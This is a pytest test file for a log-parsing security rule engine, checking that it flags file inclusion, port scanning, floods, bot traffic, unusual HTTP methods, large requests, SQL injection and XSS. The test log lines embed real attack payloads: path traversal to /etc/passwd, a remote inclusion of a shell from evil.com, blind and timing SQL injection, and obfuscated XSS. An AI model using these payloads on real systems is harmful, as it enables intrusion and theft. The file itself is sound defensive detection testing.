from datetime import datetime, timedelta, timezone
from parser.rules import Alert, RuleEngine
from parser.utils import parse_line

import pytest


def test_file_inclusion_detection():
    """Test File Inclusion (LFI/RFI) detection"""
    logs = [
        '1.1.1.1 - - [10/Oct/2000:13:55:00 -0700] "GET /include?file=../../../etc/passwd HTTP/1.1" 200 0 "-" "Mozilla/5.0"',
        '2.2.2.2 - - [10/Oct/2000:13:55:10 -0700] "GET /load?page=../../../../var/log/apache2/access.log HTTP/1.1" 200 0 "-" "Mozilla/5.0"',
        '3.3.3.3 - - [10/Oct/2000:13:55:20 -0700] "GET /view?file=http://evil.com/shell.php HTTP/1.1" 200 0 "-" "Mozilla/5.0"',
    ]
    evs = [parse_line(l, "apache") for l in logs]
    engine = RuleEngine()
    alerts = engine.run([e for e in evs if e])

    file_inclusion_alerts = [a for a in alerts if a.type == "File Inclusion"]
    assert len(file_inclusion_alerts) >= 2  # Should detect LFI and RFI


def test_port_scanning_detection():
    """Test Port Scanning detection"""
    logs = [
        '1.1.1.1 - - [10/Oct/2000:13:55:00 -0700] "GET /robots.txt HTTP/1.1" 404 0 "-" "nmap/7.94"',
        '1.1.1.1 - - [10/Oct/2000:13:55:05 -0700] "GET /sitemap.xml HTTP/1.1" 404 0 "-" "nmap/7.94"',
        '1.1.1.1 - - [10/Oct/2000:13:55:10 -0700] "GET /.well-known/security.txt HTTP/1.1" 404 0 "-" "nmap/7.94"',
        '1.1.1.1 - - [10/Oct/2000:13:55:15 -0700] "GET /favicon.ico HTTP/1.1" 404 0 "-" "nmap/7.94"',
        '1.1.1.1 - - [10/Oct/2000:13:55:20 -0700] "GET /humans.txt HTTP/1.1" 404 0 "-" "nmap/7.94"',
        '1.1.1.1 - - [10/Oct/2000:13:55:25 -0700] "GET /crossdomain.xml HTTP/1.1" 404 0 "-" "nmap/7.94"',
        '1.1.1.1 - - [10/Oct/2000:13:55:30 -0700] "GET /.env HTTP/1.1" 404 0 "-" "nmap/7.94"',
        '1.1.1.1 - - [10/Oct/2000:13:55:35 -0700] "GET /config.php HTTP/1.1" 404 0 "-" "nmap/7.94"',
        '1.1.1.1 - - [10/Oct/2000:13:55:40 -0700] "GET /wp-config.php HTTP/1.1" 404 0 "-" "nmap/7.94"',
        '1.1.1.1 - - [10/Oct/2000:13:55:45 -0700] "GET /config.json HTTP/1.1" 404 0 "-" "nmap/7.94"',
        '1.1.1.1 - - [10/Oct/2000:13:55:50 -0700] "GET /.git/config HTTP/1.1" 404 0 "-" "nmap/7.94"',
        '1.1.1.1 - - [10/Oct/2000:13:55:55 -0700] "GET /.svn/entries HTTP/1.1" 404 0 "-" "nmap/7.94"',
        '1.1.1.1 - - [10/Oct/2000:13:56:00 -0700] "GET /.htaccess HTTP/1.1" 404 0 "-" "nmap/7.94"',
        '1.1.1.1 - - [10/Oct/2000:13:56:05 -0700] "GET /web.config HTTP/1.1" 404 0 "-" "nmap/7.94"',
        '1.1.1.1 - - [10/Oct/2000:13:56:10 -0700] "GET /phpinfo.php HTTP/1.1" 404 0 "-" "nmap/7.94"',
    ]
    evs = [parse_line(l, "apache") for l in logs]
    engine = RuleEngine(port_scan_threshold=10, port_scan_window_sec=300)
    alerts = engine.run([e for e in evs if e])

    port_scan_alerts = [a for a in alerts if a.type == "Port Scanning"]
    assert len(port_scan_alerts) >= 1


def test_ddos_detection():
    """Test DDoS/Flood detection"""
    # Generate many requests in a short time window (within 60 seconds)
    base_time = datetime.now(timezone.utc)
    logs = []
    for i in range(150):  # More than the 100 threshold
        # Spread requests over 60 seconds (within the DDoS window)
        timestamp = (base_time + timedelta(seconds=i % 60)).strftime(
            "%d/%b/%Y:%H:%M:%S %z"
        )
        logs.append(
            f'1.1.1.1 - - [{timestamp}] "GET / HTTP/1.1" 200 1000 "-" "Mozilla/5.0"'
        )

    evs = [parse_line(l, "apache") for l in logs]
    engine = RuleEngine()
    alerts = engine.run([e for e in evs if e])

    ddos_alerts = [a for a in alerts if a.type == "DDoS/Flood Attack"]
    assert len(ddos_alerts) >= 1


def test_bot_traffic_detection():
    """Test Bot Traffic detection"""
    logs = [
        '1.1.1.1 - - [10/Oct/2000:13:55:00 -0700] "GET / HTTP/1.1" 200 1000 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"',
        '2.2.2.2 - - [10/Oct/2000:13:55:10 -0700] "GET / HTTP/1.1" 200 1000 "-" "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)"',
        '3.3.3.3 - - [10/Oct/2000:13:55:20 -0700] "GET / HTTP/1.1" 200 1000 "-" "Slurp/3.0 (+http://help.yahoo.com/help/us/ysearch/slurp)"',
    ]
    evs = [parse_line(l, "apache") for l in logs]
    engine = RuleEngine()
    alerts = engine.run([e for e in evs if e])

    bot_alerts = [a for a in alerts if a.type == "Bot Traffic"]
    assert len(bot_alerts) >= 2


def test_unusual_http_methods():
    """Test Unusual HTTP Method detection"""
    logs = [
        '1.1.1.1 - - [10/Oct/2000:13:55:00 -0700] "PUT /api/data HTTP/1.1" 200 1000 "-" "Mozilla/5.0"',
        '2.2.2.2 - - [10/Oct/2000:13:55:10 -0700] "DELETE /api/user/123 HTTP/1.1" 200 1000 "-" "Mozilla/5.0"',
        '3.3.3.3 - - [10/Oct/2000:13:55:20 -0700] "PATCH /api/user/123 HTTP/1.1" 200 1000 "-" "Mozilla/5.0"',
        '4.4.4.4 - - [10/Oct/2000:13:55:30 -0700] "TRACE / HTTP/1.1" 200 1000 "-" "Mozilla/5.0"',
        '5.5.5.5 - - [10/Oct/2000:13:55:40 -0700] "CONNECT proxy.example.com:8080 HTTP/1.1" 200 1000 "-" "Mozilla/5.0"',
    ]
    evs = [parse_line(l, "apache") for l in logs]
    engine = RuleEngine()
    alerts = engine.run([e for e in evs if e])

    unusual_method_alerts = [a for a in alerts if a.type == "Unusual HTTP Method"]
    assert len(unusual_method_alerts) >= 4


def test_large_request_detection():
    """Test Large Request detection"""
    logs = [
        '1.1.1.1 - - [10/Oct/2000:13:55:00 -0700] "POST /upload HTTP/1.1" 200 15000000 "-" "Mozilla/5.0"',  # 15MB
    ]
    evs = [parse_line(l, "apache") for l in logs]
    engine = RuleEngine()
    alerts = engine.run([e for e in evs if e])

    large_request_alerts = [a for a in alerts if a.type == "Large Request"]
    assert len(large_request_alerts) >= 1


def test_enhanced_sql_injection_detection():
    """Test enhanced SQL Injection detection patterns"""
    logs = [
        '1.1.1.1 - - [10/Oct/2000:13:55:00 -0700] "GET /p.php?id=1\' UNION SELECT * FROM information_schema.tables -- HTTP/1.1" 200 0 "-" "Mozilla/5.0"',
        '2.2.2.2 - - [10/Oct/2000:13:55:10 -0700] "GET /p.php?id=1\' AND (SELECT COUNT(*) FROM information_schema.tables)>0 -- HTTP/1.1" 200 0 "-" "Mozilla/5.0"',
        '3.3.3.3 - - [10/Oct/2000:13:55:20 -0700] "GET /p.php?id=1\' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)=\'a\' -- HTTP/1.1" 200 0 "-" "Mozilla/5.0"',
        '4.4.4.4 - - [10/Oct/2000:13:55:30 -0700] "GET /p.php?id=1\' AND (SELECT BENCHMARK(5000000,ENCODE(\'MSG\',\'by 5 seconds\'))) -- HTTP/1.1" 200 0 "-" "Mozilla/5.0"',
    ]
    evs = [parse_line(l, "apache") for l in logs]
    engine = RuleEngine()
    alerts = engine.run([e for e in evs if e])

    sqli_alerts = [a for a in alerts if a.type == "SQL Injection"]
    assert len(sqli_alerts) >= 3


def test_enhanced_xss_detection():
    """Test enhanced XSS detection patterns"""
    logs = [
        '1.1.1.1 - - [10/Oct/2000:13:55:00 -0700] "GET /search?q=<iframe src=javascript:alert(1)></iframe> HTTP/1.1" 200 0 "-" "Mozilla/5.0"',
        '2.2.2.2 - - [10/Oct/2000:13:55:10 -0700] "GET /search?q=<svg onload=alert(1)> HTTP/1.1" 200 0 "-" "Mozilla/5.0"',
        '3.3.3.3 - - [10/Oct/2000:13:55:20 -0700] "GET /search?q=javascript:alert(1) HTTP/1.1" 200 0 "-" "Mozilla/5.0"',
        '4.4.4.4 - - [10/Oct/2000:13:55:30 -0700] "GET /search?q=<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script> HTTP/1.1" 200 0 "-" "Mozilla/5.0"',
    ]
    evs = [parse_line(l, "apache") for l in logs]
    engine = RuleEngine()
    alerts = engine.run([e for e in evs if e])

    xss_alerts = [a for a in alerts if a.type == "Cross-Site Scripting (XSS)"]
    assert len(xss_alerts) >= 3


def test_rule_engine_initialization():
    """Test RuleEngine initialization with custom parameters"""
    engine = RuleEngine(
        brute_force_threshold=5,
        brute_force_window_sec=30,
        port_scan_threshold=10,
        port_scan_window_sec=120,
        burst_5xx_threshold=20,
        burst_5xx_window_sec=60,
    )

    assert engine.brute_force_threshold == 5
    assert engine.brute_force_window == timedelta(seconds=30)
    assert engine.port_scan_threshold == 10
    assert engine.port_scan_window == timedelta(seconds=120)
    assert engine.burst_5xx_threshold == 20
    assert engine.burst_5xx_window == timedelta(seconds=60)


def test_alert_creation():
    """Test Alert dataclass creation"""
    alert = Alert(
        type="Test Alert",
        severity="medium",
        ts="2023-01-01T12:00:00Z",
        ip="192.168.1.1",
        details={"url": "/test", "method": "GET"},
    )

    assert alert.type == "Test Alert"
    assert alert.severity == "medium"
    assert alert.ts == "2023-01-01T12:00:00Z"
    assert alert.ip == "192.168.1.1"
    assert alert.details["url"] == "/test"
    assert alert.details["method"] == "GET"
